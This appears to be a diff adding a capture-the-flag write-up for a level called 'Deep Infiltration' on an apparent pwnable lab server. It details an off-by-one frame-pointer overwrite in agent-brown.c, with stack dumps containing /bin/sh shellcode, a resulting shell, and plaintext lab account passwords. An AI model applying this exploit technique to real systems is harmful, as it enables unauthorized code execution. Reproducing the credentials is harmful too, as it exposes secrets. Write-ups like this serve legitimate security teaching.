@@ -1,0 +1,63 @@
+3. Deep Infiltration
+
+Vulnerability: In file agent-brown.c, line 9, the loop condition i <= 64 allows overflowing 'buf' one byte that is usually new line byte '\n', but we will use byte '\x08' for convenience. This changes the saved frame pointer SFP into forged saved frame pointer FSP that probably points to somewhere in 'buf'. We can anticipate the location to write to 'buf' with new_eip and shellcode.
+
+Approach: Introduce a space-occupying variable to lower the 'buf' location to be close to the beginning of 0x??????00 address. Compute the address that FSP points to after being overwritten with the byte '\x08' at the least significant byte position, we call this address is A. Write to the address A+4 the new_eip followed up by the shellcode.  
+
+Attack:
+
+Step 1. Find address of 'buf': Use gdb steppping over code lines until after 'buf' is initialized, then type 'print &buf[0]' to get 0xbffff898.
+
+Step 2. Compute the size of space-occupying variable embedded into the address space to lower the 'buf' location to 0xbffff808, the size of 'buf' is 64, so it ends at 0xbffff844 and the address of SFP is 0xbffff848 holding value which will be overwritten into 0xbffff808
+
+Before write 'buf':
+
+0xbffff808:	0x00000000	0xb7ff3fdc	0xbffff8c4	0x00000000
+0xbffff818:	0x00000000	0xb7e5f043	0x0804820e	0x00000000
+0xbffff828:	0x00ca0000	0x00000001	0xbffffa0e	0x0000002f
+0xbffff838:	0xbffff88c	0xb7fd2000	0x080484b0	0x080482f0  <--end of 'buf'
+0xbffff848:	0xbffff858	0x0804841d	0xbffffa26	0xbffff858
+                 ^
+                 |
+                SFP
+
+After write and overflow 'buf':
+
+                new return address
+                          |        shellcode starts from here 
+                          V         V
+
+0xbffff808:	0x6f6f6f6f	0xbffff810	0x895e1feb	0xc0310876
+0xbffff818:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
+0xbffff828:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
+0xbffff838:	0x732f6e69	0x6f6f6f68	0x6f6f6f6f	0x6f6f6f6f <--end of 'buf'
+0xbffff848:	0xbffff808	0x0804841d	0xbffffa26	0xbffff858
+                 ^
+                 |
+                FSP (SFP overwritten with the last byte)
+
+! Attention: Before writing to 'buf', the input must be ^ (1 << 5) due to the trick in agent-brown.c, line 10.
+
+After the function call finishes, ESP jumps back to EBP (containing address of FSP), then jumps to rip while EBP jumps to where FSP points to. ESP jumps up 4 bytes, then jumps to EBP, then jumps up 4 bytes where exactly the new return address point to shellcode lies.  
+
+Result:
+
+brown@pwnable:~$ invoke ./exploit 
+oooo����^�1��F�F
+                  �
+                   ����V
+                        1ۉ�@̀�����/bin/shoooooooooo����&���X���x���\�&���\���������p�������
+$ whoami
+jz
+$ cat README
+Perhaps we are asking the wrong questions.
+
+user: jz
+pass: a;Vn3/D@
+
+
+--
+Now, ssh into jz and find:
+
+user: jones
+pass: Kg.ru8ng
